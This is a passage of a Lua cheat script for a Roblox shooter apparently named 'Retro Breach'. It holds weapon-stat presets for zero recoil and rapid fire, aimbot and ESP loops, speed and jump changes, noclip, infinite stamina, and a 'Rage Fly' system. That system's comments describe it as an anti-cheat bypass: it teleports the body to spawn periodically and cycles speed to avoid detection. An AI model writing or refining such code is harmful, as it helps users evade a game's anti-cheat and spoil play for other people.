        Config.WeaponViewPunch = 0
        Config.WeaponInitialSpread = 0
        Config.WeaponMaxSpread = 0
        Config.WeaponReloadSpeed = 5
        Config.WeaponStartDamageDropoff = 9999
        Config.WeaponMaxDamageDropOff = 9999
        UILib:CreateNotification({
            Text = "Rapid Fire loaded! (Re-equip weapon)",
            Duration = 2
        })
    end
})

UILib:CreateButton(ModifyGunsPanel, {
    Text = "Sniper Mode Preset",
    Callback = function()
        Config.WeaponFireRate = 300
        Config.WeaponRecoilVertical = 0
        Config.WeaponRecoilHorizontal = 0
        Config.WeaponSpread = 0
        Config.WeaponMuzzleVelocity = 2500
        Config.WeaponBulletsFired = 1
        Config.WeaponViewPunch = 0
        Config.WeaponInitialSpread = 0
        Config.WeaponMaxSpread = 0
        Config.WeaponReloadSpeed = 1.5
        Config.WeaponStartDamageDropoff = 9999
        Config.WeaponMaxDamageDropOff = 9999
        UILib:CreateNotification({
            Text = "Sniper Mode loaded! (Re-equip weapon)",
            Duration = 2
        })
    end
})

UILib:CreateButton(ModifyGunsPanel, {
    Text = "Reset to Original",
    Callback = function()
        if next(WeaponOriginalStats) then
            Config.WeaponFireRate = WeaponOriginalStats.FireRate or 1900
            Config.WeaponSpread = WeaponOriginalStats.Spread or 0
            Config.WeaponMuzzleVelocity = WeaponOriginalStats.MuzzleVelocity or 500
            Config.WeaponBulletsFired = WeaponOriginalStats.BulletsFired or 1
            Config.WeaponRecoilVertical = 0
            Config.WeaponRecoilHorizontal = 0
            Config.WeaponInitialSpread = 0
            Config.WeaponMaxSpread = 0
            Config.WeaponReloadSpeed = 1
            Config.WeaponStartDamageDropoff = 9999
            Config.WeaponMaxDamageDropOff = 9999
            UILib:CreateNotification({
                Text = "Reset to original stats",
                Duration = 2
            })
        else
            UILib:CreateNotification({
                Text = "No weapon equipped yet!",
                Duration = 2
            })
        end
    end
})



local noclipKeyHeld = false
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.B then
        noclipKeyHeld = true
        if LocalPlayer.Character and not Config.NoClip then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") and not originalCollisionStates[part] then
                    originalCollisionStates[part] = part.CanCollide
                end
            end
        end
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.B then
        noclipKeyHeld = false
        if not Config.NoClip and LocalPlayer.Character then
            for part, originalState in pairs(originalCollisionStates) do
                if part and part.Parent then
                    part.CanCollide = originalState
                end
            end
            originalCollisionStates = {}    
        end
    end
end)
local mainLoop = RunService.RenderStepped:Connect(function()
    updateAimbot()
    updatePlayerESP()
    updateItemESP()
end)
table.insert(_G.RetroBreach.Connections, mainLoop)
local playerLoop = RunService.Heartbeat:Connect(function()
    if LocalPlayer.Character then
        local humanoid = getHumanoid(LocalPlayer.Character)
        if humanoid then
            if Config.WalkSpeed ~= 16 then
                humanoid.WalkSpeed = Config.WalkSpeed
            end
            if Config.JumpPower ~= 50 then
                humanoid.JumpPower = Config.JumpPower
            end
        end
        if Config.NoClip or noclipKeyHeld then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)
table.insert(_G.RetroBreach.Connections, playerLoop)
Players.PlayerAdded:Connect(function(player)
    if player.Character and Config.PlayerESP then
        player.Character:WaitForChild("HumanoidRootPart", 5)
        task.wait(0.2)
        createPlayerESP(player.Character)
    end
    player.CharacterAdded:Connect(function(character)
        if Config.PlayerESP then
            character:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.2)
            createPlayerESP(character)
        end
    end)
end)
Players.PlayerRemoving:Connect(function(player)
    if player and player.Character and _G.RetroBreach.ESPHighlights[player.Character] then
        local esp = _G.RetroBreach.ESPHighlights[player.Character]
        if esp.highlight then pcall(function() esp.highlight:Destroy() end) end
        if esp.teamText then pcall(function() esp.teamText:Remove() end) end
        if esp.nameText then pcall(function() esp.nameText:Remove() end) end
        _G.RetroBreach.ESPHighlights[player.Character] = nil
    end
end)
for _, player in ipairs(Players:GetPlayers()) do
    player.CharacterAdded:Connect(function(character)
        if Config.PlayerESP then
            character:WaitForChild("HumanoidRootPart", 5)
            task.wait(0.2)
            createPlayerESP(character)
        end
    end)
end

if UILib.CreateNotification then
    UILib:CreateNotification({
        Text = "Retro Breach Definitive Loaded!",
        Duration = 5,
        Color = UILib.Colors and UILib.Colors.SUCCESS or Color3.fromRGB(0, 255, 0)
    })
end
task.spawn(function()
    task.wait(1)
    local itemsFolder = Workspace:FindFirstChild("ItemSpawns")
    if itemsFolder then
        local itemNames = {}
        for _, item in ipairs(itemsFolder:GetChildren()) do
            if not table.find(itemNames, item.Name) then
                table.insert(itemNames, item.Name)
            end
        end
        table.sort(itemNames)
    else
    end
end)

local _ReplicatedStorage = game:GetService("ReplicatedStorage")
local _pcall = pcall
local _task_wait = task.wait

task.spawn(function()
    while true do
        local success, err = _pcall(function()
            if not Config.InfiniteStamina then 
                _task_wait(0.5)
                return 
            end
            
            -- SAFETY CHECKS (Prevent crash on death/round reset)
            local char = LocalPlayer.Character
            if not char or not char.Parent then 
                _task_wait(1)
                return 
            end
            
            -- Check for RootPart (ensures character is physically present)
            if not char:FindFirstChild("HumanoidRootPart") then
                _task_wait(1)
                return
            end
            
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if not humanoid or humanoid.Health <= 0 then
                _task_wait(1)
                return
            end
            
            -- Method 1: Try to find and set stamina value directly (mobile-compatible)
            -- WRAPPED IN PCALL for extra safety on mobile
            pcall(function()
                if humanoid then
                    -- Look for stamina attribute or value
                    local stamina = humanoid:FindFirstChild("Stamina") or 
                                  char:FindFirstChild("Stamina")
                    
                    if stamina and (stamina:IsA("NumberValue") or stamina:IsA("IntValue")) then
                        stamina.Value = 100
                    elseif humanoid:GetAttribute("Stamina") ~= nil then
                        humanoid:SetAttribute("Stamina", 100)
                    end
                end
            end)
            
            -- Removed Method 2 (firesignal) as it can cause crashes on some mobile executors
        end)
        
        if not success then
            _task_wait(1)
        end
        
        _task_wait(0.2)  -- Update rate
    end
end)

-- 
-- RAGE FLY SYSTEM (Press V to toggle)
-- Only runs when Config.RageFly is enabled
-- -------------------------------------------------------
task.spawn(function()
    while not Config.RageFly do
        task.wait(0.5)
    end
    
-- ADVANCED FLY BYPASS
-- - Periodic ground touches every 1.5s to reset anti-cheat
-- - Variable speed (average → fast → average) to avoid detection
-- Controls: V = Fly, E = Noclip, WASD + Space/Shift

local player = game.Players.LocalPlayer
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- Configuration
local BASE_SPEED = 25  -- Slower base speed for better control
local FAST_SPEED = 50  -- Slower fast speed
local GROUND_TOUCH_INTERVAL = 2.5  -- Spawn reset every 2.5 seconds (only while shooting)
local SPEED_CYCLE_TIME = 0.5  -- Cycle speed every 0.5 seconds

-- State
local flying = false
local noclipping = false
local flyConnection = nil
local noclipConnection = nil
local voidBypass = nil
local lastGroundTouch = 0
local lastSpeedChange = 0
local currentSpeed = BASE_SPEED
local speedPhase = 1  -- 1=average, 2=fast, 3=average
local isShooting = false
local bodyAtSpawn = false
local spawnCFrame = nil
local mouseConnection = nil
local camRotX = 0
local camRotY = 0
local shootingStartTime = 0  -- Track when shooting started for rage mode

-- Key states
local keys = {
    w = false,
    a = false,
    s = false,
    d = false,
    space = false,
    shift = false
}

-- Get character
local function getChar()
    return player.Character
end

local function getRoot()
    local char = getChar()
    return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso"))
end

local function getHumanoid()
    local char = getChar()
    return char and char:FindFirstChildOfClass("Humanoid")
end

-- Find any nearby part to touch (for anti-cheat reset)
local function findNearbyPart()
    local hrp = getRoot()
    if not hrp then return nil end
    
    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.FilterDescendantsInstances = {getChar()}
    
    -- Try different directions to find ANY nearby part (increased to 1000 studs)
    local directions = {
        Vector3.new(0, -1000, 0),   -- Below
        Vector3.new(0, 1000, 0),    -- Above
        Vector3.new(1000, 0, 0),    -- Right
        Vector3.new(-1000, 0, 0),   -- Left
        Vector3.new(0, 0, 1000),    -- Forward
        Vector3.new(0, 0, -1000),   -- Backward
    }
    
    for _, direction in ipairs(directions) do
        local ray = workspace:Raycast(hrp.Position, direction, rayParams)
        if ray and ray.Instance then
            return ray.Position, ray.Instance
        end
    end
    
    -- Fallback: Find ANY part in workspace
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Parent ~= getChar() and obj.Name ~= "HumanoidRootPart" then
            return obj.Position, obj
        end
    end
    
    return nil, nil
end

-- Start void bypass
local function startVoidBypass()
    if voidBypass then return end
    
    voidBypass = RunService.Heartbeat:Connect(function()
        local hrp = getRoot()
        if hrp and hrp.Parent then
            local currentPos = hrp.Position
            if currentPos.Y < -50 then
                hrp.CFrame = CFrame.new(currentPos.X, -40, currentPos.Z)
                hrp.Velocity = Vector3.new(0, 0, 0)
            end
        end
    end)
end

-- Start noclip
local function startNoclip()
    if noclipping then return end
    noclipping = true
    
    
    noclipConnection = RunService.Stepped:Connect(function()
        if not noclipping then return end
        
        local char = getChar()
        if not char then return end
        
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end)
end

-- Stop noclip
local function stopNoclip()
    if not noclipping then return end
    noclipping = false
    
    
    if noclipConnection then
        noclipConnection:Disconnect()
        noclipConnection = nil
    end
    
    local char = getChar()
    if char then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- Check if player is above ground
local function isAboveGround()
    local hrp = getRoot()
    if not hrp then return false end
    
    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.FilterDescendantsInstances = {getChar()}
    
    -- Raycast straight down (500 studs)
    local ray = workspace:Raycast(hrp.Position, Vector3.new(0, -500, 0), rayParams)
    
    return ray ~= nil
end

-- Touch spawn to reset anti-cheat
local function touchGround()
    local hrp = getRoot()
    if hrp then
        local originalPos = hrp.Position
        local wasFlying = flying
        
        -- Check if flying over void
        local aboveGround = isAboveGround()
        
        -- RAGE MODE: If shooting for 7+ seconds continuously, use 3s break
        local shootingDuration = tick() - shootingStartTime
        local isRageMode = isShooting and shootingDuration >= 7
        
        local spawnWaitTime
        if isRageMode then
            spawnWaitTime = 3.0  -- Rage mode: 3 second break
        elseif aboveGround then
            spawnWaitTime = 0.5  -- Normal over ground: 0.5s
        else
            spawnWaitTime = 6.0  -- Over void: 6s (3x longer)
        end
        
        -- Temporarily disable fly
        if wasFlying then
            flying = false
        end
        
        -- Lock camera in place
        local cam = workspace.CurrentCamera
        local originalCamCFrame = cam.CFrame
        local originalCamType = cam.CameraType
        cam.CameraType = Enum.CameraType.Scriptable
        
        -- Find spawn location
        local spawnLocation = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChildOfClass("SpawnLocation")
        
        -- If no SpawnLocation, find any spawn part
        if not spawnLocation then
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("SpawnLocation") then
                    spawnLocation = obj
                    break
                end
            end
        end
        
        if spawnLocation then
            -- Teleport body to spawn (camera stays locked)
            hrp.CFrame = spawnLocation.CFrame + Vector3.new(0, 5, 0)
            hrp.Velocity = Vector3.new(0, 0, 0)
            
            -- Wait to reset anti-cheat (longer if over void)
            task.wait(spawnWaitTime)
            
            -- Return body to original position
            hrp.CFrame = CFrame.new(originalPos)
            hrp.Velocity = Vector3.new(0, 0, 0)
        end
        
        -- Restore camera
        cam.CameraType = originalCamType
        cam.CFrame = originalCamCFrame
        
        -- Re-enable fly
        if wasFlying then
            flying = true
        end
        
        local timeSinceStart = math.floor((tick() - lastGroundTouch) * 10) / 10
        local groundStatus = aboveGround and "✅" or "⚠️ VOID"
    end
end

-- Start flying
local originalPosition = nil  -- Store original position before flying

local function startFly()
    if flying then return end
    flying = true
    
    local hrp = getRoot()
    if not hrp then 
        return 
    end
    
    -- SAVE ORIGINAL POSITION before teleporting anywhere
    originalPosition = hrp.CFrame
    
    -- Find and save spawn location
    local spawnLocation = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChildOfClass("SpawnLocation")
    if not spawnLocation then
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("SpawnLocation") then
                spawnLocation = obj
                break
            end
        end
    end
    
    if spawnLocation then
        spawnCFrame = spawnLocation.CFrame + Vector3.new(0, 5, 0)
    end
    
    lastGroundTouch = tick()
    lastSpeedChange = tick()
    
    -- Reset camera rotation
    camRotX = 0
    camRotY = 0
    
    -- Force third person (save original zoom)
    local cam = workspace.CurrentCamera
    local humanoid = getHumanoid()
    if humanoid then
        humanoid.CameraOffset = Vector3.new(0, 0, 0)
    end
    cam.CameraSubject = getHumanoid()
    
    -- Zoom out to third person
    player.CameraMaxZoomDistance = 15
    player.CameraMinZoomDistance = 10
    
    -- Wait for camera to actually zoom out
    task.wait(0.3)
    
    -- NOW set flying to true after camera is ready
    flying = true
    
    -- Unlock mouse for camera control
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    UserInputService.MouseIconEnabled = false
    
    -- Get mouse for delta reading
    local mouse = player:GetMouse()
    
    flyConnection = RunService.Heartbeat:Connect(function()
        if not flying then return end
        
        local hrp = getRoot()
        if not hrp then
            stopFly()
            return
        end
        
        local currentTime = tick()
        local cam = workspace.CurrentCamera
        
        -- Continuously enforce mouse lock (in case user unlocks it) - PC ONLY
        if not UserInputService.TouchEnabled then
            UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
        end
        
        -- Update camera rotation from mouse delta
        local mouseDelta = UserInputService:GetMouseDelta()
        camRotY = camRotY - mouseDelta.X * 0.004
        camRotX = math.clamp(camRotX - mouseDelta.Y * 0.004, -math.pi/2 + 0.1, math.pi/2 - 0.1)
        
        -- Variable speed cycling (keep this for less predictable movement)
        if currentTime - lastSpeedChange >= SPEED_CYCLE_TIME then
            speedPhase = speedPhase + 1
            if speedPhase > 3 then
                speedPhase = 1
            end
            
            if speedPhase == 1 then
                currentSpeed = BASE_SPEED
            elseif speedPhase == 2 then
                currentSpeed = FAST_SPEED
            else
                currentSpeed = BASE_SPEED
            end
            
            lastSpeedChange = currentTime
        end
        
        -- Calculate movement direction
        local direction = Vector3.new(0, 0, 0)
        local h = getHumanoid()
        
        -- PC Keys
        if keys.w then direction = direction + (cam.CFrame.LookVector * currentSpeed) end
        if keys.s then direction = direction - (cam.CFrame.LookVector * currentSpeed) end
        if keys.a then direction = direction - (cam.CFrame.RightVector * currentSpeed) end
        if keys.d then direction = direction + (cam.CFrame.RightVector * currentSpeed) end
        if keys.space then direction = direction + (Vector3.new(0, 1, 0) * currentSpeed) end
        if keys.shift then direction = direction - (Vector3.new(0, 1, 0) * currentSpeed) end 
        
        -- Mobile Joystick Support
        if h and h.MoveDirection.Magnitude > 0 then
            direction = direction + (h.MoveDirection * currentSpeed)
        end
        
        -- Mobile Jump Button Support (Ascend)
        if h and h.Jump then
             direction = direction + (Vector3.new(0, 1, 0) * currentSpeed)
        end 
        
        -- NEW SYSTEM: Body positioning based on shooting
        if isShooting then
            -- Periodic spawn reset ONLY while shooting (every 1.5s)
            if currentTime - lastGroundTouch >= GROUND_TOUCH_INTERVAL then
                touchGround()
                lastGroundTouch = currentTime
            end
            
            -- When shooting, body teleports TO camera and follows it
            cam.CameraType = Enum.CameraType.Scriptable
            
            -- Move camera with rotation
            local newCamPos = cam.CFrame.Position + (direction * 0.016)
            cam.CFrame = CFrame.new(newCamPos) * CFrame.fromEulerAnglesYXZ(camRotX, camRotY, 0)
            
            -- Teleport body TO camera position
            hrp.CFrame = CFrame.new(cam.CFrame.Position)
            hrp.Velocity = Vector3.new(0, 0, 0)
            hrp.RotVelocity = Vector3.new(0, 0, 0)
            
            if hrp.AssemblyLinearVelocity then
                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end
            if hrp.AssemblyAngularVelocity then
                hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            end
            
            bodyAtSpawn = false
        else
            -- When not shooting, keep body at spawn and move camera freely
            if spawnCFrame and not bodyAtSpawn then
                hrp.CFrame = spawnCFrame
                hrp.Velocity = Vector3.new(0, 0, 0)
                bodyAtSpawn = true
            end
            
            -- Camera moves freely (independent of body)
            cam.CameraType = Enum.CameraType.Scriptable
            
            -- Move camera with rotation (YXZ order for proper FPS camera)
            local newCamPos = cam.CFrame.Position + (direction * 0.016)
            cam.CFrame = CFrame.new(newCamPos) * CFrame.fromEulerAnglesYXZ(camRotX, camRotY, 0)
        end
    end)
end

-- Stop flying
function stopFly()
    if not flying then return end
    flying = false
    
    
    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end
    
    if mouseConnection then
        mouseConnection:Disconnect()
        mouseConnection = nil
    end
    
    local hrp = getRoot()
    if hrp then
        hrp.Velocity = Vector3.new(0, 0, 0)
        
        -- RESTORE ORIGINAL POSITION
        if originalPosition then
            hrp.CFrame = originalPosition
        end
    end
    
    -- Restore camera
    local cam = workspace.CurrentCamera
    cam.CameraType = Enum.CameraType.Custom
    cam.CameraSubject = getHumanoid()
    
    -- Restore camera zoom
    player.CameraMaxZoomDistance = 128
    player.CameraMinZoomDistance = 0.5
    
    -- Restore mouse behavior
    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
    UserInputService.MouseIconEnabled = true
end

-- Key input handling
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    local key = input.KeyCode.Name:lower()
    
    if key == "v" then
        if flying then
            stopFly()
        else
            startFly()
        end
    elseif key == "e" then
        if noclipping then
            stopNoclip()
        else
            startNoclip()
        end
    elseif keys[key] ~= nil then
        keys[key] = true
    elseif key == "space" then
        keys.space = true
    elseif key == "leftshift" or key == "rightshift" then
        keys.shift = true
    end
    
    -- Detect shooting (left mouse button)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        if not isShooting then
            shootingStartTime = tick()  -- Record when shooting started
        end
        isShooting = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    local key = input.KeyCode.Name:lower()
    
    if keys[key] ~= nil then
        keys[key] = false
    elseif key == "space" then
        keys.space = false
    elseif key == "leftshift" or key == "rightshift" then
        keys.shift = false
    end
    
    -- Stop shooting
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isShooting = false
        shootingStartTime = 0  -- Reset rage mode timer
        bodyAtSpawn = false
    end
end)

-- Character respawn handling
player.CharacterAdded:Connect(function()
    task.wait(1)
    if flying then
        stopFly()
    end
    if noclipping then
        stopNoclip()
    end
end)

-- Infinite Stamina / Run Loop
task.spawn(function()
    while true do
        task.wait(0.1)
        if Config.InfiniteStamina then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild("Humanoid")
            if hum and hum.Health > 0 then
                -- Force WalkSpeed (Infinite Run)
                if hum.WalkSpeed < 20 then
                     hum.WalkSpeed = 20
                end
                
                -- Mobile Infinite Run Animation
                if Config.InfiniteStamina and (UserInputService.TouchEnabled or Config.MobileAiming) then
                    if hum.MoveDirection.Magnitude > 0 then
                        -- Player is moving, ensure run anim is playing
                         if not _G.RetroBreach.RunAnimTrack then
                             local anim = Instance.new("Animation")
                             anim.AnimationId = "rbxassetid://76255515469759"
                             _G.RetroBreach.RunAnimTrack = hum:LoadAnimation(anim)
                             _G.RetroBreach.RunAnimTrack.Priority = Enum.AnimationPriority.Action
                             _G.RetroBreach.RunAnimTrack.Looped = true
                         end
                         
                         if _G.RetroBreach.RunAnimTrack and not _G.RetroBreach.RunAnimTrack.IsPlaying then
                             _G.RetroBreach.RunAnimTrack:Play()
                         end
                    else
                        -- Stopped moving, stop anim
                        if _G.RetroBreach.RunAnimTrack and _G.RetroBreach.RunAnimTrack.IsPlaying then
                            _G.RetroBreach.RunAnimTrack:Stop()
                        end
                    end
                end
                
                -- Visual Stamina Refill
                if hum:FindFirstChild("Stamina") then
                    hum.Stamina.Value = 100
                end
            end
        end
    end
end)

end) -- End of Rage Fly task.spawn